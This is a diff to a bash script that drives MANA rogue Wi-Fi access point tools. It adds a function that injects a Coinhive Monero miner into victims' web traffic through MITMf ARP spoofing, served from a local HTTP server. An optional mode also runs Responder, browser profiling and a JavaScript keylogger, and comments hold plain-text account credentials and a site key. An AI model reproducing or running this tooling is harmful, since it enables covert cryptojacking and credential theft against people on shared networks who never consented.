@@ -35,11 +35,18 @@ clearwifi(){
 }
 
 start_macchanger(){
-read -t 5 -p "Changing mac in 5 seconds, type x to skip [>]" ans
+if [ -z $1 ]; then
+ interface=$phy
+else
+ interface=$1
+fi
+read -t 3 -p "Changing mac in 3 seconds, type x to skip [>]" ans
+echo ""
  case $ans in
   x|X) echo -e "\n $txtgrn [*] Skipping macchange.." ;;
-  *) ifconfig "$phy" down; macchanger -r "$phy"; ifconfig "$phy" up ;;
+  *) ifconfig "$interface" down; macchanger -r "$interface"; ifconfig "$interface" up ;;
  esac
+exit
 }
 
 start_hostapd(){
@@ -132,6 +139,66 @@ start_mitmdump(){
 	mitmdump --mode transparent
 }
 
+start-coinhive(){
+#https://github.com/byt3bl33d3r/MITMf/
+#https://null-byte.wonderhowto.com/how-to/inject-coinhive-miners-into-public-wi-fi-hotspots-0182250/
+#https://coinhive.com/settings/sites #user: i1123977@nwytg.com #pass: i1123977 #public-site-key: FUq2rCkflht7xM7o3RB8t6W2SyMutCNY
+#https://coin-hive.com/lib/coinhive.min.js #Miner js file
+ gateway="192.168.2.254"
+#Public-site-key from: https://coinhive.com/settings/sites
+ PUB_SITE_KEY="FUq2rCkflht7xM7o3RB8t6W2SyMutCNY"
+
+echo "Use gateway? $gateway and;"
+echo "Use Coinhive Public Site Key? $PUB_SITE_KEY"
+read -p "(ctrl-c to abort)"
+
+echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+ ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
+ ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+#echo -e "$txtgrn [*] Changing MAC of: $upstream $endclr"
+#  ifconfig $upstream down
+#   macchanger -r $upstream
+#  ifconfig $upstream up
+echo -e "$txtgrn [*] Generating new name for payload $endclr"
+ payload_random="$(openssl rand -hex 16).js$endclr"
+echo -e "$txtgrn [*] New name for payload=$payload_random $endclr"
+echo -e "$txtgrn [*] Copying coinhive config-file $endclr"
+ cp $share/coinhive-js/coinhive.min.js $share/coinhive-js/$payload_random
+
+echo -e "$txtgrn [*] Replacing pub site key in miner.js $endclr"
+ sed -i "s|.*$Coinhive.Anonymous('.*$|var miner = new CoinHive.Anonymous('$PUB_SITE_KEY');|g" $share/coinhive-js/miner.js
+
+IP_ADDR="$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')" ;\
+IP_ADDR_HEX="$(printf '%02X' $(echo ${IP_ADDR//./ }) ; echo)"
+ echo -e "$txtgrn [*] Using for payload and converting ip: $IP_ADDR to hex format & storing it in miner.js $endclr"
+ sed -i "s|https://coinhive.com/lib/coinhive.min.js|http://$IP_ADDR_HEX/$payload_random|g" $share/coinhive-js/miner.js
+
+echo -e "$txtgrn [*] Restarting networking service $endclr"
+ /etc/init.d/networking restart
+
+echo -e "$txtgrn [*] Starting httpyserver for serving payload: $payload_random $endclr"
+ cd $share/coinhive-js/ && xterm -hold -T "Httpyserver" -e python3 -m http.server 80 &
+
+mkdir -p /tmp/MITMf_logs/logs
+cd /tmp/MITMf_logs/
+
+read -p "Use additional addons for MITMf?(y/n) [>]" -n1 ans
+ if [ $ans = "" ];then
+  echo -e "$txtred [*] No input! Using no additional addons $endclr"
+  ans="no"
+ fi
+
+echo -e "$txtgrn [*] Starting MITMf $endclr"
+ case $ans in
+  y|Y|Yes|yes|YES) $share/MITMf/./mitmf.py -i $upstream --inject --js-file $share/coinhive-js/miner.js --arp --spoof --gateway $gateway --screen --browserprofiler --responder --analyze --jskeylo$ ;;
+  n|N|No|no|NO)  $share/MITMf/./mitmf.py -i $upstream --inject --js-file $share/coinhive-js/miner.js --arp --spoof --gateway $gateway& ;;
+  *) echo -e "$txtred [*] Wrong input!,exiting.. $endclr"; sleep 3 ;exit ;;
+ esac
+
+	hangon && #Wait for Enter key
+	killem	  #Kill all shit and exit
+}
 hangon(){
         echo -e "\n"
         echo -e "$txtgrn [*]The captured traffic will be in $loot \n $endclr"
@@ -153,14 +220,16 @@ killem(){
         pkill -f firelamb
         pkill -f start_firelamb
         pkill -f hostapd
+        pkill -f http.server
         pkill -f start_hostapd
-#        pkill -f msfconsole
-#        pkill -f start_msfconsole
+        pkill -f mitmf
+#       pkill -f msfconsole
+#       pkill -f start_msfconsole
         pkill -f start_nat_firewall
         pkill -f net-creds
         pkill -f nodogsplash
-#        pkill -f python
-#        pkill -f ruby
+#       pkill -f python
+#       pkill -f ruby
         pkill -f sslsplit
         pkill -f sslstrip
         pkill -f stunnel4
@@ -386,6 +455,7 @@ echo "$FUNCNAME"
  Usage: $(basename "$0") [-m] [--start-nat-simple-mitm- Will fire up MANA in NAT mode, with mitmdump
  Usage: $(basename "$0") [-n] [--start-noupstream     - Will start MANA in a "fake Internet" mode. Useful for places where people leave their wifi on, but there is no upstream Internet. Also contains the captive portal.
  Usage: $(basename "$0") [-e] [--start-noupstream-eap - Will start MANA with the EAP attack and noupstream mode.
+ Usage: $(basename "$0") [-c] [--start-coinhive       - Will start mitm JavaScript miner for the Monero Blockchain.
 
  Usage: $(basename "$0") [--check_ap_mode]            - Check if "AP-mode" supported interface is present
  Usage: $(basename "$0") [--start_hostname]           - Change systems hostname
@@ -432,7 +502,7 @@ for ARG in $@
       --start_firelamb)  	   start_firelamb       ;;
       --start_netcreds)  	   start_netcreds       ;;
       --start_msfconsole)	   start_msfconsole     ;;
-      --start_mitmdump)	           start_mitmdump       ;;      
+      --start_mitmdump)	           start_mitmdump       ;;
       --hangon)  		   hangon               ;;
       --killem)  		   killem               ;;
    #Main launchers
@@ -441,6 +511,7 @@ for ARG in $@
       -n|--start-noupstream)       start-noupstream     ;;
       -e|--start-noupstream-eap)   start-noupstream-eap ;;
       -d|--start_nodogsplash)      start_nodogsplash    ;;
+      -c|--start-coinhive)         start-coinhive       ;;
    #Other
       -e|--edit)                   nano "$0" ; exit     ;;
       -h|--help)                   usage    ; break    ;;
